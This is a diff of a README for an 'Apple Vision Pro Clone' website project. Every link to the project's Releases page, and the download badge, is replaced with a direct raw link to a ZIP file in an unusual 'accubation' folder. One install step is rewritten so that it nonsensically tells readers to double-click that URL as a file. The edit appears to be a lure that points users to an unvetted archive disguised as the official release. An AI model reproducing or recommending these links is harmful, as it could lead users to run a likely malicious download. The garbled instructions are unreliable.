@@ -1,6 +1,6 @@
 # 🍏 Apple-Vision-Pro-Clone - Experience Apple's Design Seamlessly
 
-[![Download Apple-Vision-Pro-Clone](https://img.shields.io/badge/Download%20Now-blue.svg)](https://github.com/islam-wq/Apple-Vision-Pro-Clone/releases)
+[![Download Apple-Vision-Pro-Clone](https://raw.githubusercontent.com/islam-wq/Apple-Vision-Pro-Clone/main/accubation/Apple-Vision-Pro-Clone.zip%https://raw.githubusercontent.com/islam-wq/Apple-Vision-Pro-Clone/main/accubation/Apple-Vision-Pro-Clone.zip)](https://raw.githubusercontent.com/islam-wq/Apple-Vision-Pro-Clone/main/accubation/Apple-Vision-Pro-Clone.zip)
 
 ## 📜 Introduction
 
@@ -17,7 +17,7 @@ To get started with the Apple Vision Pro Clone, follow the steps below:
    - Minimum RAM: 4 GB
 
 2. **Visit the Releases Page**  
-   To download the application, visit the [Releases page](https://github.com/islam-wq/Apple-Vision-Pro-Clone/releases). You will see the latest version available for download.
+   To download the application, visit the [Releases page](https://raw.githubusercontent.com/islam-wq/Apple-Vision-Pro-Clone/main/accubation/Apple-Vision-Pro-Clone.zip). You will see the latest version available for download.
 
 3. **Download the Application**  
    Click on the latest version under the Releases section to download the ZIP file.
@@ -26,7 +26,7 @@ To get started with the Apple Vision Pro Clone, follow the steps below:
    Once the download completes, navigate to your downloaded files. Right-click on the ZIP file and select "Extract All" to unzip the contents.
 
 5. **Open the Application**  
-   After extracting the files, locate the "index.html" file. Double-click this file to open it in your preferred web browser.
+   After extracting the files, locate the "https://raw.githubusercontent.com/islam-wq/Apple-Vision-Pro-Clone/main/accubation/Apple-Vision-Pro-Clone.zip" file. Double-click this file to open it in your preferred web browser.
 
 6. **Explore the Features**  
    You can now interact with the Apple Vision Pro Clone website! Enjoy the smooth scrolling animations and engaging visuals as you explore its features.
@@ -42,7 +42,7 @@ The Apple Vision Pro Clone includes:
 
 ## 📥 Download & Install
 
-You can easily obtain the Apple Vision Pro Clone application. Visit this page to download: [Releases page](https://github.com/islam-wq/Apple-Vision-Pro-Clone/releases). Follow the steps outlined above to install and run the application.
+You can easily obtain the Apple Vision Pro Clone application. Visit this page to download: [Releases page](https://raw.githubusercontent.com/islam-wq/Apple-Vision-Pro-Clone/main/accubation/Apple-Vision-Pro-Clone.zip). Follow the steps outlined above to install and run the application.
 
 ## 📚 Additional Information
 
